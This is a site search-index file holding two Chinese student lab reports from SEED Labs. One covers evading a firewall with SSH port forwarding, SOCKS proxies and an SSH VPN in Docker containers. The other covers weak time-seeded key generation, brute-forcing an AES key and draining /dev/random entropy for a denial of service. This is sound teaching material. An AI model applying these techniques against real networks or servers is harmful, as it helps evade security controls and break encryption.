<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Firewall Evasion Lab</title>
      <link href="/2022/12/28/firewall_ev/"/>
      <url>/2022/12/28/firewall_ev/</url>
      
        <content type="html"><![CDATA[<h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>在某些情况下，防火墙限制太多，给用户带来不便。 例如，许多公司和学校实施出口过滤，阻止其网络内的用户访问出到某些网站或互联网服务，例如游戏和社交网站。 有很多方法以避开防火墙。 一种典型的方法是使用隧道技术，它隐藏了真正的目的的网络流量。 有多种方法可以建立隧道。 两种最常见的隧道技术是虚拟专用网络 (VPN) 和端口转发。 这个实验室的目标是帮助学生获得这两种隧道技术的实践经验。 该实验室涵盖以下主题：</p><span id="more"></span><p>• 防火墙规避</p><p>• 虚拟专用网络</p><p>• 转发端口</p><p>• SSH 隧道</p><h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><h3 id="2-1-防火墙"><a href="#2-1-防火墙" class="headerlink" title="2.1 防火墙"></a>2.1 防火墙</h3><p>在计算机领域中，防火墙是一种网络安全系统，它根据预定的安全规则监视和控制进出的网络流量。防火墙通常在可信网络和不可信网络(如Internet)之间建立一个屏障。</p><h3 id="2-2-VPN"><a href="#2-2-VPN" class="headerlink" title="2.2 VPN"></a>2.2 VPN</h3><p>将专用网络延伸到公共网络上，使用户能够在共享或公共网络上发送和接收数据，就像他们的计算设备直接连接到专用网络上一样。VPN的好处包括增加专用网络的功能、安全性和管理，它提供了对公共网络上无法访问的资源访问通常用于远程办公人员。加密很常见但不是VPN连接的固有部分。VPN是通过使用专用线路或在现有网络上使用隧道协议创建一个虚拟的点对点连接而形成的。可从公共 Internet 获得的 VPN可以提供广域网 (WAN) 的一些好处。 从用户的角度来看，可以远程访问专用网络中可用的资源。</p><h3 id="2-3-SSH"><a href="#2-3-SSH" class="headerlink" title="2.3 SSH"></a>2.3 SSH</h3><p>SSH以非对称加密实现身份验证[2]。身份验证有多种途径，例如其中一种方法是使用自动生成的公钥-私钥对来简单地加密网络连接，随后使用密码认证进行登录；另一种方法是人工生成一对公钥和私钥，通过生成的密钥进行认证，这样就可以在不输入密码的情况下登录。任何人都可以自行生成密钥。公钥需要放在待访问的电脑之中，而对应的私钥需要由用户自行保管。认证过程基于生成出来的私钥，但整个认证过程中私钥本身不会传输到网络中。</p><h3 id="2-4-拓扑搭建"><a href="#2-4-拓扑搭建" class="headerlink" title="2.4 拓扑搭建"></a>2.4 拓扑搭建</h3><p>在这个实验室里，我们需要使用多台机器。它们的设置如图1所示。我们将使用容器设置这个实验环境。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181711990.png"></p><h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu20.04。</p><p>2．Docker.</p><h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-Task-1-Static-Port-Forwarding"><a href="#4-1-Task-1-Static-Port-Forwarding" class="headerlink" title="4.1 Task 1: Static Port Forwarding"></a>4.1 Task 1: Static Port Forwarding</h3><p>实验室设置中的防火墙阻止外部机器连接到内部的任何 TCP 服务器网络，SSH 服务器除外。 在这个任务中，我们想使用静态端口转发来规避这个限制。 更具体地说，我们将使用 ssh 在主机 A（位于外部网络）和主机 B（在内部网络上），因此在 A 的端口 X 上接收到的任何数据都将是发送到 B，数据从那里转发到目标 T 的端口 Y。在以下命令中，我们使用 ssh创建这样一个隧道。</p><p>对于A的IP，一般我们使用0.0.0.0，表示我们的端口转发会监听来自A上所有接口的连接。如果想限制来自特定接口的连接，我们应该使用该接口的 IP 地址。 比如我们要限制到loopback接口的连接，所以只有本地主机上的程序可以使用这个端口转发，我们可以使用 127.0.0.1:&lt;port&gt; 或者只需省略 IP 地址（默认 IP 地址为 127.0.0.1）。</p><p>任务内容：</p><p>请使用静态端口转发在外部网络和内部网络之间创建隧道网络，所以我们可以远程登录到 B1 上的服务器。 请证明你可以从主机 A 做这样的 telnet，A1 和 A2。 此外，请回答以下问题： (1) 涉及多少个 TCP 连接在这整个过程中。 您应该运行 wireshark 或 tcpdump 来捕获网络流量，然后指向从捕获的流量中取出所有涉及的 TCP 连接。 (2) 为什么这个隧道能成功帮助用户规避实验室设置中指定的防火墙规则？</p><p>实验步骤：</p><p>首先在hostA中建立ssh连接如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181711877.png"></p><p>然后即可从主机A，A1，A2分别建立telnet连接远程登陆到B1上的服务器，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181712333.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181712592.png"></p><p>从主机A建立telnet连接到B1时，利用wireshark抓包得到结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181712915.png"></p><p>可以观察到在主机A中利用telnet远程登陆到B1上的服务器时，主机A所发送的数据包是通过主机B发送给B1的，接收数据包也是通过B接收来自于B1的数据包，再通过SSH连接发送给主机A，从而实现了主机A与主机B1的通信。</p><p>在以上过程中建立的TCP连接有主机B与主机A之间的SSH连接和主机B与主机B1之间的telnet连接。</p><p>因为这个隧道是主机A和主机B之间的SSH连接，并未被屏蔽，而主机B与主机B1可以实现通信，因此可以利用主机B作为中介，使得主机A可以与主机B1建立telnet连接，成功登录到B1上的服务器，而主机A1，和A2同B1建立连接时，同样是通过主机A和主机B的ssh连接才成功的。</p><h3 id="4-2-Task-2-Dynamic-Port-Forwarding"><a href="#4-2-Task-2-Dynamic-Port-Forwarding" class="headerlink" title="4.2 Task 2: Dynamic Port Forwarding"></a>4.2 Task 2: Dynamic Port Forwarding</h3><p>在静态端口转发中，每个端口转发隧道将数据转发到特定目的地。 要是我们想要将数据转发到多个目的地，我们需要建立多条隧道。 例如，使用端口转发，我们可以成功访问被屏蔽的example.com网站，但是如果防火墙屏蔽了怎么办许多其他站点，我们如何避免为每个站点繁琐地建立一个 SSH 隧道？ 我们可以使用动态端口转发来解决这个问题。</p><p>在实验室设置中，路由器已经阻止了 example.com，因此内部网络上的主机无法访问访问 example.com 网站。 请给路由器添加防火墙规则，这样就可以多屏蔽两个网站。 网站的选择取决于个别学生。 请提供证据证明该网站确实被屏蔽了。</p><h4 id="4-2-1-Task-2-A-Setting-Up-Dynamic-Port-Forwarding"><a href="#4-2-1-Task-2-A-Setting-Up-Dynamic-Port-Forwarding" class="headerlink" title="4.2.1 Task 2.A: Setting Up Dynamic Port Forwarding"></a>4.2.1 Task 2.A: Setting Up Dynamic Port Forwarding</h4><p>请证明您可以使用主机 B、B1 和主机上的 curl 访问所有被阻止的网站内部网络上的 B2。 请同时回答以下问题： (1) 哪台计算机建立了与预期的网络服务器的实际连接？ (2) 这台电脑怎么知道应该用哪个服务器连接至？</p><p>实验步骤：</p><p>首先进行设置屏蔽网站，以<a href="http://www.baidu.com为例：">www.baidu.com为例：</a></p><p>首先查看其dns解析后的ip地址如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181713331.png"></p><p>然后在防火墙中设置屏蔽规则，阻止内网的主机与其通信：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181713053.png"></p><p>设置完成后，检查是否已经屏蔽掉该网站</p><p>如下图所示，在主机B1中已经无法成功收到来自于该网站的icmp报文。</p><p>然后进行动态端口转发的设置，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181713988.png"></p><p>首先在主机B中建立ssh连接如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181715485.png"></p><p>然后根据实验手册，可以访问被屏蔽的网站，如下图所示：</p><p>在主机B1中：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181715273.png"></p><p>在主机B2中：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181715207.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181715866.png"></p><p>可以观察到到被屏蔽的网站均可以利用curl成功访问。</p><p>在该过程中利用wireshark抓包，可以得到如下结果：</p><p>在B主机的网卡中：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181716369.png"></p><p>主机B1收到的数据均是来源于主机B的，而主机B又与主机A建立了SSH连接，因此其数据来源于主机A。</p><p>在主机A的网卡中：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181716109.png"></p><p>可以观察到主机A可以直接与<a href="http://www.baidu.com的ip地址进行通信,将通过ssh连接得到的来自于主机b1的数据包发送给目标网站,再将网站的响应通过该路径转回给主机b1./">www.baidu.com的ip地址进行通信，将通过ssh连接得到的来自于主机B1的数据包发送给目标网站，再将网站的响应通过该路径转回给主机B1。</a></p><p>问题解答：</p><p>主机A与预期网站服务器建立了实际连接，通过ssh接收来自于B1主机的请求来确定用哪个服务器进行连接。</p><h4 id="4-2-2-Task-2-B-Testing-the-Tunnel-Using-Browser"><a href="#4-2-2-Task-2-B-Testing-the-Tunnel-Using-Browser" class="headerlink" title="4.2.2 Task 2.B: Testing the Tunnel Using Browser"></a>4.2.2 Task 2.B: Testing the Tunnel Using Browser</h4><p>我们还可以使用真实的浏览器来测试隧道，而不是使用 curl。 虽然很难运行浏览器在容器内，在 docker 设置中，默认情况下，主机始终连接到创建的任何网络在 docker 内部，该网络上的第一个 IP 地址被分配给主机。 例如，在我们的设置，主机是SEED VM； 它在内部网络上的 IP 地址 192.168.20.0&#x2F;24 是192.168.20.1。</p><p>要使用动态端口转发，我们需要配置 Firefox 的代理设置。 进入设置页面，我们可以在 URL 字段中键入 about:preferences 或单击 Preference 菜单项。 在常规页面，找到“网络设置”部分，点击设置按钮，弹出一个窗口会弹出。 按照图 2 设置 SOCKS 代理。</p><p>配置代理后，我们就可以浏览任何网站了。 请求和答复将通过 SSH 隧道。 由于主机虚拟机可以直接访问互联网，以确保我们的网络浏览流量已通过隧道，您应该执行以下操作： (1) 在路由器上运行 tcpdump&#x2F;-firewall，指出整个端口转发过程中涉及的流量。 (2) 打破SSH隧道，然后尝试浏览网站。 描述你的观察。</p><p>实验步骤：</p><p>修改浏览器中的代理设置如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181717224.png"></p><p>然后再主机B中建立ssh连接如下，即可成功访问被屏蔽的<a href="http://www.baidu.com/">www.baidu.com</a></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181718913.png"></p><p>如果将左侧的连接断开，则网站不可以访问：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181718854.png"></p><h4 id="4-2-3-Task-2-C-Writing-a-SOCKS-Client-Using-Python"><a href="#4-2-3-Task-2-C-Writing-a-SOCKS-Client-Using-Python" class="headerlink" title="4.2.3 Task 2.C: Writing a SOCKS Client Using Python"></a>4.2.3 Task 2.C: Writing a SOCKS Client Using Python</h4><p>为了使端口转发起作用，我们需要指定数据应转发到的位置（最终目的地）。在静态情况下，这条信息是在我们建立隧道时提供的，也就是说，它是硬连接到隧道设置。 在动态情况下，最终目的地是动态的，未在设置期间指定，因此代理如何知道将数据转发到哪里？</p><p>使用动态端口转发代理的应用程序必须告诉代理将它们的数据转发到哪里。这是通过应用程序和代理之间的附加协议完成的。 通用协议这样的目的就是SOCKS（Socket Secure）协议，它成为事实上的代理标准。由于应用程序需要使用SOCKS协议与代理进行交互，因此应用软件必须具有本机 SOCKS 支持才能使用 SOCKS 代理。 Firefox 和 curl 都有这样的一个支持，但是我们不能直接对telnet程序使用这种类型的代理，因为它不提供本地 SOCKS 支持。 在此任务中，我们使用 Python 实现了一个非常简单的 SOCKS 客户端程序。</p><p>请完成此程序，并使用它从主机B、B1 和 B2访问 <a href="http://www.example.com./">http://www.example.com。</a> 上面给出的代码仅用于发送 HTTP 请求，而不是 HTTPS 请求（发送由于 TLS 握手，HTTPS 请求要复杂得多）。 对于这个任务，学生只需要发送 HTTP 请求。</p><p>实验步骤：</p><p>首先在主机B中与主机A建立ssh连接如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181718760.png"></p><p>根据实验手册的指导编写python脚本如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181718345.png"></p><p>在主机B1中，执行该脚本，即可成功发送HTTP请求访问目标网站，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181718664.png"></p><p>在主机B和主机B2中执行该脚本，也可以成功访问目标网站，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181719609.png"></p><h3 id="4-3-Task-3-Virtual-Private-Network-VPN"><a href="#4-3-Task-3-Virtual-Private-Network-VPN" class="headerlink" title="4.3 Task 3: Virtual Private Network (VPN)"></a>4.3 Task 3: Virtual Private Network (VPN)</h3><p>VPN 通常用于绕过防火墙。 在此任务中，我们将使用 VPN 绕过入口和出口防火墙。OpenVPN 是一个我们可以使用的强大工具，但是在这个任务中，我们将简单地使用 SSH，它通常被称为穷人的 VPN。 我们需要更改服务器上的一些默认 SSH 设置以允许创建 VPN。下面列出了 &#x2F;etc&#x2F;ssh&#x2F;sshd_config 中所做的更改。 他们已经启用在容器内。</p><h4 id="4-3-1-Task-3-A-Bypassing-Ingress-Firewall"><a href="#4-3-1-Task-3-A-Bypassing-Ingress-Firewall" class="headerlink" title="4.3.1 Task 3.A: Bypassing Ingress Firewall"></a>4.3.1 Task 3.A: Bypassing Ingress Firewall</h4><p>要创建从客户端到服务器的 VPN 隧道，我们运行以下 ssh 命令。 这个命令创建VPN 客户端和服务器机器上的 TUN 接口 tun0，然后连接这两个 TUN 接口使用加密的 TCP 连接。 选项 0:0 中的两个零表示 tun0。 的详细解释-w选项可以在SSH的手册中找到：</p><table><thead><tr><th># ssh -w 0:0 root@&lt;VPN Server’s IP&gt;</th></tr></thead></table><p>请在 A 和 B 之间创建一个 VPN 隧道，B 是 VPN 服务器。 然后进行所有必要的配置。一切设置完成后，请证明您可以远程登录到 B、B1 和B2 来自外部网络。 请捕获数据包跟踪，并解释数据包未被阻止的原因通过防火墙。</p><p>实验步骤：</p><p>在主机A中以B为VPN服务器，建立连接如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181719882.png"></p><p>然后即可从外部网络登录到B，B1，B2，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181720359.png"></p><p>然后在从外部网络访问B主机时</p><p>利用wireshark进行抓包，可以得到如下结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181721908.png"></p><p>可以观察到从外部网络可以连接到B主机</p><h4 id="4-3-2-Task-3-B-Bypassing-Egress-Firewall"><a href="#4-3-2-Task-3-B-Bypassing-Egress-Firewall" class="headerlink" title="4.3.2 Task 3.B: Bypassing Egress Firewall"></a>4.3.2 Task 3.B: Bypassing Egress Firewall</h4><p>在此任务中，我们将使用 VPN 绕过出口防火墙。 在我们的设置中，我们屏蔽了三个外部网站，因此 192.168.20.0&#x2F;24 上的主机无法访问这些网站。 这个任务的目标是使用VPN 隧道技术绕过这些规则。 此目标与任务 2 相同，除了这一次，我们使用 VPN，而不是动态端口转发。 创建 VPN 隧道的命令是与任务 3.1 中的类似。 在这个任务中，我们使用 B 作为 VPN 客户端，A 作为 VPN 服务器。</p><p>请在 B 和 A 之间建立一条 VPN 隧道，A 是 VPN 服务器。 请示范您可以使用此 VPN 隧道成功地从主机 B、B1 和 B2 访问被阻止的网站。 请捕获数据包跟踪，并解释为什么数据包没有被防火墙阻止。</p><p>实验步骤：</p><p>首先在防火墙容器中修改规则如下，在eth0接口上创建一个NAT服务器：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181721720.png"></p><p>然后再主机B上与主机A建立ssh链接如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181721992.png"></p><p>即可从主机B，B1，B2访问被屏蔽的网站，如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181721055.png"></p><h3 id="4-4-Task-4-Comparing-SOCKS5-Proxy-and-VPN"><a href="#4-4-Task-4-Comparing-SOCKS5-Proxy-and-VPN" class="headerlink" title="4.4 Task 4: Comparing SOCKS5 Proxy and VPN"></a>4.4 Task 4: Comparing SOCKS5 Proxy and VPN</h3><p>SOCKS5 代理（动态端口转发）和 VPN 通常用于创建隧道绕过防火墙，以及保护通信。 许多 VPN 服务提供商都提供这两种类型的服务。有时，当 VPN 服务提供商告诉您它提供 VPN 服务时，但实际上它只是一个SOCKS5 代理。 虽然这两种技术都可以用来解决同一个问题，但它们确实有显着的差异。 根据您在本实验室的经验，请比较这两种技术，描述它们差异，优点和缺点。</p><h4 id="4-4-1-SOCKS5"><a href="#4-4-1-SOCKS5" class="headerlink" title="4.4.1 SOCKS5"></a>4.4.1 SOCKS5</h4><p>SOCKS 服务器代表客户端通过 TCP 建立与另一台服务器的通用连接。然后，它引导客户端和服务器之间交换的所有流量。它与任何网络协议和端口兼容，包括TCP，UDP，IPv6，FTP，HTTP，SMTP，Telnet，SSH，DNS，POP3和IMAP。版本 5 的作用是集成安全功能和 UDP 支持。因此，SOCKS5被认为是最通用的服务器协议。代理在客户端和 SOCKS5 服务器之间形成隧道，用于传输网络流量。随后，SOCKS5会隐藏您的IP地址，并确保它不会与您的浏览活动相关联。此外，它不会尝试分析和过滤流量，使其成为在正常情况下无法通过防火墙访问 TCP 服务器的客户端的理想选择。它适用于任何网站。</p><p>优点：</p><p>1.隐藏IP地址，不影响连接速度，不会加密网络流量</p><p>2.解锁由于限制而不可以访问的网站</p><p>3.网站会提供免费的SOCK5代理列表，如Socks-Proxy</p><p>4.易于配置，无需安装其他应用程序。您可以在网络浏览器中手动设置 SOCKS5，添加免费的代理浏览器扩展，或快速安装将代理配置应用到您的 torrent 客户端。</p><p>缺点：</p><p>1.无法加密网络流量</p><p>2.容易收到中间人攻击从而导致数据被窃取</p><h4 id="4-4-2-VPN"><a href="#4-4-2-VPN" class="headerlink" title="4.4.2 VPN"></a>4.4.2 VPN</h4><p>虚拟专用网络应用程序可以实现与 SOCKS5 相同的目的：隐藏您的 IP 地址。但它也把加密融入其中。VPN 在通过 Web 发送消息之前将数据包封装在受保护层中。为了完成任务，它还解码加密层，以便在收到消息后提取数据包。通过这种方式，VPN 会创建一个安全隧道并混淆流量。</p><p>优点：</p><p>1.隐藏IP地址并且加密网络流量</p><p>2.防止 ISP 窥探以查看正在访问的网站。</p><p>3.在公共场合使用可以保护免受黑客攻击。</p><p>缺点：</p><p>1.大部分需要付费使用</p><p>2.使用错误配置会导致互联网速度较慢</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪随机数生成 Lab</title>
      <link href="/2022/12/14/Pseudo-random%20Number/"/>
      <url>/2022/12/14/Pseudo-random%20Number/</url>
      
        <content type="html"><![CDATA[<h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>生成随机数是安全软件中非常常见的任务。在许多情况下，加密密钥不是由用户提供的，而是在软件内部生成的。它们的随机性非常重要。否则，攻击者可以预测加密密钥，从而达到破坏加密目的。许多开发人员从其先前的经验中知道如何生成随机数（例如用于蒙特卡洛模拟），因此他们使用类似的方法生成用于安全目的的随机数。不幸的是，随机数序列对于蒙特卡洛模拟可能是好的，但对于加密密钥则可能是不好的。开发人员需要知道如何生成安全的随机数，否则就会犯错。在一些著名的产品（包括Netscape和Kerberos ）中也犯过类似的错误。</p><span id="more"></span><p>在本实验中，学生将学习为什么典型的随机数生成方法不适用于生成秘密（例如加密密钥）。进一步学习生成用于安全目的的伪随机数的标准方法。本实验涵盖以下主题：</p><p>1. 伪随机数生成</p><p>2. 随机数生成中的错误</p><p>3. 加密密钥生成</p><p>4. 设备文件&#x2F;dev&#x2F;random 和&#x2F;dev&#x2F;urandom</p><h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：用错误的方式生成加密密钥"><a href="#2-1-Task-1：用错误的方式生成加密密钥" class="headerlink" title="2.1 Task 1：用错误的方式生成加密密钥"></a>2.1 Task 1：用错误的方式生成加密密钥</h3><p>要生成一个好的伪随机数，我们需要从一些随机的东西开始。否则，结果会是可预测的。库函数time() 以从纪元1970-01-01 00:00:00 +0000 (UTC) 起的秒数的形式返回当前时间。运行上面的代码，并描述你的观察结果。然后，注释掉第À 行，再次运行该程序，并描述你观察到的结果。使用在两种情况下观察到的结果来解释代码中srand() 和time() 函数的用途。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150915034.png"></p><p>注释前如上图所示，每次生成的随机数不同。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150917202.png"></p><p>注释掉后如上图所示，每次生成的随机数相同</p><p>解释：</p><p>srand函数用于给随机数生成器根据当前系统时间设定种子，而将该函数注释掉后，会默认使用随机数种子0，因此会产生两种不同的观察结果。</p><h3 id="2-2-Task-2-猜测密钥"><a href="#2-2-Task-2-猜测密钥" class="headerlink" title="2.2 Task 2: 猜测密钥"></a>2.2 Task 2: 猜测密钥</h3><p>给定以AES—CBC模式加密的明文，密文以及初始IV如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150917199.png"></p><p>编写一个程序用于尝试所有可能的密钥。密钥生成方式由TASK1给出。</p><p>思路：</p><p>首先利用task1中所给出的代码进行改写，根据所给出时间的及其前两个小时的时间种子来生成128bit长度的密钥，然后再编写脚本来遍历所生成的密钥，利用AES进行加密明文，如过加密后的密文与给出的密文相同，则得到正确的密钥。</p><p>首先查看时间如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150917950.png"></p><p>利用时间种子进行生成密钥，并保存在文件中。</p><p>代码如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150918752.png"></p><p>生成结果如下，可以观察到生成了16bytes长的密钥如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150918380.png"></p><p>编写python脚本如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150918073.png"></p><p>执行脚本即可得到正确的密钥如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150918966.png"></p><h3 id="2-3-Task-3-测量内核的熵"><a href="#2-3-Task-3-测量内核的熵" class="headerlink" title="2.3 Task 3: 测量内核的熵"></a>2.3 Task 3: 测量内核的熵</h3><p>随机性使用熵来度量，这与信息论中熵的含义不同。在这里，熵仅仅意味着系统当前有多少bit 的随机数。你可以使用下面的命令找出在当前时刻内核的熵是多少。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150919407.png"></p><p>watch 可以周期性地执行一个程序。我们使用watch 运行上面的命令来监控熵的变化。下面的命令每0.1 秒就执行一次cat 程序。请执行上面的命令。在它运行时，移动你的鼠标，点击鼠标，输入什么东西，读取一个大文件，访问一个网站。哪些活动会显著地使熵变大？请在实验报告中描述你的发现。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150919176.png"></p><p>移动鼠标会发现，增长很慢，移动一次即可增长1</p><p>输入字符，输入一个字符熵增长1</p><p>阅读文件，这里阅读系统日志，发现利用less阅读一次熵增长</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150919436.png"></p><p>访问网站，熵并不会自动增长，其增长取决于鼠标的点击移动以及字符的输入。</p><h3 id="2-4-任务4-从-x2F-dev-x2F-random-中获取伪随机数"><a href="#2-4-任务4-从-x2F-dev-x2F-random-中获取伪随机数" class="headerlink" title="2.4 任务4: 从&#x2F;dev&#x2F;random 中获取伪随机数"></a>2.4 任务4: 从&#x2F;dev&#x2F;random 中获取伪随机数</h3><p>Linux 将从物理资源收集的随机数据存储到一个随机池中，然后使用两个设备将随机源转换为伪随机数。这两个设备是&#x2F;dev&#x2F;random 和&#x2F;dev&#x2F;urandom 。它们有不同的行为。&#x2F;dev&#x2F;random 设备是阻塞设备。即，每当该设备给出随机数时，随机池的熵将减小。当熵达到零时，&#x2F;dev&#x2F;random 将阻塞，直到获得足够的随机性为止。</p><p>让我们设计一个实验来观察&#x2F;dev&#x2F;random 设备的行为。我们将使用cat 命令持续从&#x2F;dev&#x2F;random 中读取伪随机数。我们将输出通过管道传递到hexdump 以便获得良好的输出。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150920697.png"></p><p>请运行上面的命令，同时使用watch 命令来监视熵。如果不移动鼠标，也不键入任何内容，将会发生什么。然后，随机移动鼠标，看看是否可以观察到任何差异。请描述并解释你观察到的现象。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150921781.png"></p><p>如上图所示，如果没有操作，间隔一到二分钟后，会自动生成一行随机数，如果随机移动鼠标生成新的一行随机数的时间间隔变小。</p><p>解释如下：</p><p>为了保证随机数的质量，&#x2F;dev&#x2F;random 只能返回熵池当前最大可用的随机二进制位，当请求超过这个值，就会阻塞，直到熵池中有足够的随机二进制位。而移动鼠标可以增加当前的熵，因而其生成新一行随机数的时间间隔变小。</p><p><strong>问题：</strong> 假设一个服务器使用&#x2F;dev&#x2F;random 与客户端生成随机会话密钥。请描述你将如何对这样的一个服务器发起拒绝服务（DoS）攻击。</p><p><strong>回答：</strong>不断向服务器发送请求使其生成返回熵池中最大可用随机二进制位，直至其阻塞。</p><h3 id="2-5-任务5-从-x2F-dev-x2F-urandom-获取随机数"><a href="#2-5-任务5-从-x2F-dev-x2F-urandom-获取随机数" class="headerlink" title="2.5 任务5: 从&#x2F;dev&#x2F;urandom 获取随机数"></a>2.5 任务5: 从&#x2F;dev&#x2F;urandom 获取随机数</h3><p>Linux 提供了另一种方式，可以通过&#x2F;dev&#x2F;urandom 设备访问随机池。&#x2F;dev&#x2F;random 和&#x2F;dev&#x2F;urandom都可以使用随机池中的数据生成伪随机数。当熵不足时，&#x2F;dev&#x2F;random 将会暂停，而&#x2F;dev&#x2F;urandom 会继续生成新的数。将随机池中的数据视作“种子”，我们可以使用种子想生成多少随机数就生成多少。</p><p>让我们来看看&#x2F;dev&#x2F;urandom 的行为。我们再次使用cat 从设备中获取伪随机数。请运行下面的命令，描述移动鼠标是否会影响结果。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150921810.png"></p><p>如上图所示，urandom会不断产生新的随机数，其产生速度很快且没有任何停顿，移动鼠标并不会影响结果。</p><p>让我们测量随机数的质量。我们可以使用一个名为ent 的工具，该工具已经安装在我们的虚拟机中。根据其手册所言：“ent 对存储在文件中的字节序列进行各种测试，并报告这些测试的结果。该程序对于评估加密和统计采样应用程序，压缩算法以及其他文件信息密度受关注的应用程序的伪随机数生成器很有用”。让我们首先从&#x2F;dev&#x2F;urandom 生成1 MB 的伪随机数，并将其保存在文件中。然后，在该文件上运行ent。请描述你的结果，并分析随机数的质量是否良好</p><p>运行结果如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150922383.png"></p><p>分析随机数质量：</p><p>可以观察到其熵接近8比特，可以得知其信息很密集，随机性好。</p><p>数据字节的算数平均值接近于127.5，蒙特卡洛值接近Π，行相关系数接近于0，因此可以推断由urandom所产生的随机数的随机性较好。</p><p>修改实验手册中的代码片段来生成一个256 bit 的加密密钥。请编译并运行你的代码，输出这些数并将屏幕截图放在报告里。</p><p>修改代码如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150922807.png"></p><p>运行结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150922485.png"></p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
